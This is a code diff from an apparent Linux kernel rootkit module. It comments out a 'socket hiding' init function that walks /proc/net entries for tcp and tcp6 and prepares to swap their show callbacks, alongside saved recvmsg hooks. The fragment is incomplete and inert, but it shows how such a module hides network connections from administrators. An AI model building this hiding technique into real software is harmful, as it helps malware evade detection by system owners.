@@ -30,39 +30,39 @@ int (*def_udp6_show)(struct seq_file *m, void *v);
 asmlinkage ssize_t (*def_recvmsg)(int sockfd,
 								  struct user_ssghdr __user *msg, int flags);
 
-int s_hiding_init(void)
-{
-  /* struct for all entries in /proc/<pid>/net */
-  struct proc_dir_entry *proc_current;
+/* int s_hiding_init(void) */
+/* { */
+/*   /\* struct for all entries in /proc/<pid>/net *\/ */
+/*   struct proc_dir_entry *proc_current; */
 
-  /* temporary pointers to data */
-  struct tcp_seq_afinfo *tcp_data;
-  struct udp_seq_afinfo *udp_data;
+/*   /\* temporary pointers to data *\/ */
+/*   struct tcp_seq_afinfo *tcp_data; */
+/*   struct udp_seq_afinfo *udp_data; */
 
-  /* rb structs for iterating through /proc entries */
-  struct rb_root *root = &init_net.proc_net->subdir;
-  struct rb_node *proc_node_current = rb_first(root);
-  struct rb_node *proc_node_last = rb_last(root);
+/*   /\* rb structs for iterating through /proc entries *\/ */
+/*   struct rb_root *root = &init_net.proc_net->subdir; */
+/*   struct rb_node *proc_node_current = rb_first(root); */
+/*   struct rb_node *proc_node_last = rb_last(root); */
 
-  /* initialize mutexes */
-  mutex_init(&lck_recvmsg);
-  mutex_init(&lck_tcp4);
-  mutex_init(&lck_tcp6);
-  mutex_init(&lck_udp4);
-  mutex_init(&lck_udp6);
+/*   /\* initialize mutexes *\/ */
+/*   mutex_init(&lck_recvmsg); */
+/*   mutex_init(&lck_tcp4); */
+/*   mutex_init(&lck_tcp6); */
+/*   mutex_init(&lck_udp4); */
+/*   mutex_init(&lck_udp6); */
 
-  while (proc_node_current != proc_node_last) {
+/*   while (proc_node_current != proc_node_last) { */
 
-	proc_current = rb_entry(proc_node_current, struct proc_dir_entry, subdir_node);
+/* 	proc_current = rb_entry(proc_node_current, struct proc_dir_entry, subdir_node); */
 
-	if (!strcmp(proc_current->name, "tcp")) {
-	  tcp_data = proc_current->data;
-	  //proc_current->seq_ops->show = def_tcp4_show;
-	}
-	if (!strcmp(proc_current->name, "tcp6")) {
-	  tcp_data = proc_current->data;
-	  //proc_current->seq_ops->show = def_tcp6_show;
-	}
+/* 	if (!strcmp(proc_current->name, "tcp")) { */
+/* 	  tcp_data = proc_current->data; */
+/* 	  //proc_current->seq_ops->show = def_tcp4_show; */
+/* 	} */
+/* 	if (!strcmp(proc_current->name, "tcp6")) { */
+/* 	  tcp_data = proc_current->data; */
+/* 	  //proc_current->seq_ops->show = def_tcp6_show; */
+/* 	} */
 	
-  }
-}
+/*   } */
+/* } */
